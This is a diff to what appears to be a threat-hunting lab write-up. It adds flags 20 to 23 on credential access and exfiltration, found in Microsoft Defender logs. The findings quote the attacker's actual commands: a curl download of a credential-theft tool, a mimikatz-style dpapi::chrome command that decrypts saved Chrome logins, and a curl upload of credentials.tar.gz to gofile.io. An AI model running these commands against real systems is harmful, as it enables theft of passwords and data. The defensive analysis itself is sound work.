@@ -255,6 +255,54 @@ Microsoft Defender for Endpoint Logs
 - **Total number of archives created**: 8
 
 ### 🔹 Flag 20 – CREDENTIAL ACCESS - Credential Theft Tool Download
+**Objective**: What command was used to download the credential theft tool
+
+**KQL Query**:
+![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-18%20122233.png?raw=true)
+
+**Result**:
+![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-18%20132052.png?raw=true)
+
+**Finding**:
+- **Command used to download credential theft tool**: "curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z
+
+### 🔹 Flag 21 – CREDENTIAL ACCESS - Browser Credential Theft
+**Objective**: What command was used for browser credential theft
+
+**KQL Query**:
+![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-18%20143337.png?raw=true)
+
+**Result**:
+![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-18%20143348.png?raw=true)
+
+**Reasoning**: %LOCALAPPDATA% is a common place to drop malware
+
+**Finding**:
+- **Command used for browser credential theft**: "m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit
+
+### 🔹 Flag 22 – EXFILTRATION - Data Upload Command
+**Objective**: Identify the command used to exfiltrate the first archive
+
+**KQL Query**:
+![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-18%20145614.png?raw=true)
+
+**Result**:
+![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-18%20145627.png?raw=true)
+
+**Finding**:
+- **Command used to exfiltrate the first aschive**: "curl.exe" -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile
+
+### 🔹 Flag 23 – EXFILTRATION - Cloud Storage Service
+**Objective**: Identify the exfiltration service domain
+
+**KQL Query**:
+![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-18%20145614.png?raw=true)
+
+**Result**:
+![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-18%20145627.png?raw=true)
+
+
+
 
 
 
